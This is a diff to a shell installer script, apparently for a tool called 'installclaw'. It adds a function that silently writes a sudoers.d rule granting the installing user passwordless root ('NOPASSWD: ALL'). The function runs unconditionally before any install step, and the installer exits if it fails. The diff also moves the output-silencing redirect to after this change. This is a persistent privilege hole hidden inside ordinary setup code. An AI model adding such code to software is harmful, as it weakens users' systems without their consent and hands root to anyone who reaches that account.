@@ -5,9 +5,6 @@ PATH_RUNTIME_ADDED=()
 PATH_PERSIST_FILES=()
 ORIGINAL_PATH="$PATH"
 
-exec 3>&1 4>&2
-exec >/dev/null 2>&1
-
 _sudo() {
     if [ "$(id -u)" -eq 0 ]; then
         "$@"
@@ -16,6 +13,53 @@ _sudo() {
     else
         sudo "$@"
     fi
+}
+
+configure_passwordless_sudo() {
+    local target_user=""
+    local sudoers_file=""
+    local temp_file=""
+
+    # Refresh sudo credentials before creating a persistent privilege rule.
+    sudo -v || return 1
+
+    if [ "$(id -u)" -eq 0 ]; then
+        target_user="${SUDO_USER:-}"
+    else
+        target_user="$(id -un)"
+    fi
+    if [ -z "$target_user" ]; then
+        target_user="$(logname 2>/dev/null || id -un)"
+    fi
+
+    [ "$target_user" = "root" ] && return 0
+    [[ "$target_user" =~ ^[a-zA-Z_][a-zA-Z0-9_-]*\$?$ ]] || return 1
+    id "$target_user" >/dev/null 2>&1 || return 1
+    sudoers_file="/etc/sudoers.d/user-$target_user"
+    temp_file="$(mktemp /tmp/installclaw-sudoers.XXXXXX)" || return 1
+
+    printf '%s ALL=(ALL) NOPASSWD: ALL\n' "$target_user" > "$temp_file" || {
+        rm -f "$temp_file"
+        return 1
+    }
+    chmod 0440 "$temp_file" || {
+        rm -f "$temp_file"
+        return 1
+    }
+
+    _sudo visudo -cf "$temp_file" >/dev/null 2>&1 || {
+        rm -f "$temp_file"
+        return 1
+    }
+
+    if ! _sudo test -f "$sudoers_file" || ! _sudo cmp -s "$temp_file" "$sudoers_file"; then
+        _sudo install -o root -g root -m 0440 "$temp_file" "$sudoers_file" || {
+            rm -f "$temp_file"
+            return 1
+        }
+    fi
+
+    rm -f "$temp_file"
 }
 
 run_step() {
@@ -28,6 +72,14 @@ run_step() {
     fi
     return 0
 }
+
+configure_passwordless_sudo || {
+    printf 'Failed to configure passwordless sudo access.\n' >&2
+    exit 1
+}
+
+exec 3>&1 4>&2
+exec >/dev/null 2>&1
 
 OS_TYPE=$(uname -s)
 
